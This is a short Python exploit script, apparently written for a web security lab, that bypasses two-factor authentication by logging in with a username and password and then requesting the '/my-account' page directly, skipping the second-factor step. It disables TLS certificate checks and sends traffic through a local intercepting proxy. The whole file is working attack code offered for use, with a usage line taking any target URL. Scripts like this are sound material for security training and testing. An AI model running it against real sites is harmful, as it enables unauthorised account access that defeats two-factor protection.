import sys
import requests
import urllib3
urllib3.disable_warnings(urllib3.exceptions.InsecureRequestWarning)
proxies = {'http': 'http://127.0.0.1:8080', 'https': 'http://127.0.0.1:8080'}

def bypass(url, s, user, password):
    link = url + "login"
    print("Logging to Account...")
    data = {'username':f'{user}','password':f'{password}'}
    r = s.post(link, data=data, verify=False, allow_redirects=False, proxies=proxies)
    link2 = url + "my-account"
    r = s.get(link2, verify=False, proxies=proxies)
    if "Log out" in r.text:
        print("Success bypassing 2FA.\nDone!")
    else:
        print("(-) Exploit failed.")
        sys.exit(-1)


def main():
    try:
        url = sys.argv[1]
        user = sys.argv[2]
        password  = sys.argv[3]
        s = requests.Session()
        bypass(url, s, user, password)
    except IndexError:
        print("Usage: %s <url> <username> <password>" % sys.argv[0])
        sys.exit(-1)

if __name__ == '__main__':
    main()
